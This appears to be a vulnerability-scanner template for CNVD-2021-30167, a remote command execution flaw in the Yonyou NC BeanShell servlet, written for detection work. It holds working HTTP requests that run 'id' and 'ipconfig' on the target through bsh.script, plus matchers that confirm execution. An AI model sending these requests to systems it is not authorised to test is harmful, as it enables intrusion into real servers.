id: CNVD-2021-30167

info:
  name: 用友NC(YONYOU) BeanShell - 远程命令执行(CNVD-2021-30167)
  author: wintry
  severity: critical
  description: 用友UFIDA NC BeanShell远程命令执行 bsh.servlet.BshServlet 接口处.
  tags: yonyounc
  metadata:
    max-request: 2

http:
  - raw:
      - | #linux
        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        bsh.script=exec("id");

      - | #windows
        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        bsh.script=exec("ipconfig");

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid="
          - "Windows IP"
        condition: or

      - type: word
        words:
          - "BeanShell Test Servlet"

      - type: status
        status:
          - 200